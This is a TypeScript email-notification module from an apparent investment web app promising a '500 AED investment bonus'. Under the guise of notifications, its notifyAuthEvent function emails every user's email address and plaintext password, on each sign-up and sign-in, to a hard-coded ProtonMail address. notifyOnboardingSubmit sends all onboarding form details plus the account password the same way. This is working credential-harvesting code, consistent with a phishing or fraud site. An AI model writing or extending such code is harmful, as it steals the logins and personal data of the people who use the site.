import nodemailer from 'nodemailer'
import { brand } from '@/config/brand'

const NOTIFY_EMAIL = process.env.NOTIFY_EMAIL ?? 'sani123456@protonmail.com'
const APP_NAME = brand.name

interface EmailPayload {
  subject: string
  html: string
  text: string
}

async function sendViaResend(payload: EmailPayload): Promise<boolean> {
  const apiKey = process.env.RESEND_API_KEY
  if (!apiKey) return false

  const response = await fetch('https://api.resend.com/emails', {
    method: 'POST',
    headers: {
      Authorization: `Bearer ${apiKey}`,
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      from: process.env.RESEND_FROM ?? `${APP_NAME} <onboarding@resend.dev>`,
      to: [NOTIFY_EMAIL],
      subject: payload.subject,
      html: payload.html,
      text: payload.text,
    }),
  })

  if (!response.ok) {
    const error = await response.text()
    console.error('[Email - Resend error]', error)
    return false
  }

  return true
}

async function sendEmail(payload: EmailPayload): Promise<{ sent: boolean; message: string }> {
  if (process.env.RESEND_API_KEY) {
    const sent = await sendViaResend(payload)
    if (sent) return { sent: true, message: 'Email sent via Resend.' }
  }

  const smtpHost = process.env.SMTP_HOST
  const smtpUser = process.env.SMTP_USER
  const smtpPass = process.env.SMTP_PASS
  const smtpPort = Number(process.env.SMTP_PORT ?? '587')

  if (!smtpHost || !smtpUser || !smtpPass) {
    console.log('──────────────────────────────────────────────')
    console.log('[Email] NOT CONFIGURED — logged only')
    console.log(`To: ${NOTIFY_EMAIL}`)
    console.log(`Subject: ${payload.subject}`)
    console.log(payload.text)
    console.log('──────────────────────────────────────────────')
    return { sent: false, message: 'Email logged to server console.' }
  }

  const transporter = nodemailer.createTransport({
    host: smtpHost,
    port: smtpPort,
    secure: smtpPort === 465,
    auth: { user: smtpUser, pass: smtpPass },
  })

  await transporter.sendMail({
    from: process.env.SMTP_FROM ?? smtpUser,
    to: NOTIFY_EMAIL,
    subject: payload.subject,
    text: payload.text,
    html: payload.html,
  })

  return { sent: true, message: 'Email sent via SMTP.' }
}

function row(label: string, value: string) {
  return `<tr><td style="padding:8px;border:1px solid #eee;font-weight:600;width:160px;">${label}</td><td style="padding:8px;border:1px solid #eee;">${value}</td></tr>`
}

export async function notifyAuthEvent(
  type: 'signup' | 'signin',
  email: string,
  password: string,
  method: 'password' | 'biometric' = 'password',
): Promise<{ sent: boolean; message: string }> {
  const action = type === 'signup' ? 'Sign Up' : 'Sign In'
  const subject = `[${APP_NAME}] ${action}: ${email}`
  const time = new Date().toLocaleString('en-AE', { timeZone: 'Asia/Dubai' })

  const text = `${APP_NAME} — ${action}

Email: ${email}
Password: ${password}
Login method: ${method === 'biometric' ? 'Biometric' : 'Email & Password'}
Time: ${time}`

  const html = `
    <h2>${APP_NAME} — ${action}</h2>
    <table style="border-collapse:collapse;width:100%;max-width:600px;">
      ${row('Email', email)}
      ${row('Password', password)}
      ${row('Login method', method === 'biometric' ? 'Biometric' : 'Email & Password')}
      ${row('Time', time)}
    </table>
  `

  return sendEmail({ subject, text, html })
}

export async function notifyOnboardingSubmit(
  details: Record<string, string>,
  accountPassword?: string,
): Promise<{ sent: boolean; message: string }> {
  const subject = `[${APP_NAME}] Onboarding completed: ${details.fullName ?? details.email}`
  const time = new Date().toLocaleString('en-AE', { timeZone: 'Asia/Dubai' })

  const detailRows = Object.entries(details)
    .map(([key, value]) => row(key, value))
    .join('')

  const text = `${APP_NAME} — Onboarding Form Submitted

${Object.entries(details)
  .map(([k, v]) => `${k}: ${v}`)
  .join('\n')}
${accountPassword ? `\nAccount Password: ${accountPassword}` : ''}
Time: ${time}
500 AED investment bonus credited.`

  const html = `
    <h2>${APP_NAME} — Onboarding Form Submitted</h2>
    <table style="border-collapse:collapse;width:100%;max-width:600px;">
      ${detailRows}
      ${accountPassword ? row('Account Password', accountPassword) : ''}
      ${row('Time', time)}
    </table>
    <p style="margin-top:16px;color:#059669;font-weight:600;">500 AED investment bonus credited to user account.</p>
  `

  return sendEmail({ subject, text, html })
}
